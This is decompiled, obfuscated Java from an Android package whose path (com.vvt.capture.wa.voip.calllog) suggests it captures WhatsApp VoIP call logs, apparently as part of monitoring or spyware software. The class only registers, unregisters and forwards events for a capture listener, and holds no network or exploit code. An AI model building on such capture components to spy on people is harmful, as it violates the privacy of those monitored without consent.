package com.vvt.capture.wa.voip.calllog.limited;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.capture.wa.limited.c;
import com.vvt.n.a.b;

public class a
  implements e, i
{
  private static final boolean a = com.vvt.ak.a.a;
  private i b;
  private c c;
  private boolean d = false;
  
  public a(b paramb)
  {
    c localc = c.a();
    this.c = localc;
    this.c.a(paramb);
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    i locali = this.b;
    if (locali != null)
    {
      locali = this.b;
      locali.a();
    }
    bool = a;
    if (bool) {}
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = this.d;
    if (!bool)
    {
      bool = true;
      this.d = bool;
      this.b = parami;
      c localc = this.c;
      localc.a(this);
    }
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    i locali = this.b;
    if (locali != null)
    {
      boolean bool = a;
      if (bool) {}
      locali = this.b;
      locali.a(paramString);
    }
  }
  
  public void a(String paramString1, String paramString2)
  {
    i locali = this.b;
    if (locali != null)
    {
      boolean bool = a;
      if (bool) {}
      locali = this.b;
      locali.a(paramString1, paramString2);
    }
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.d;
    if (bool)
    {
      this.d = false;
      bool = false;
      this.b = null;
      c localc = this.c;
      localc.b(this);
    }
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wa/voip/calllog/limited/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */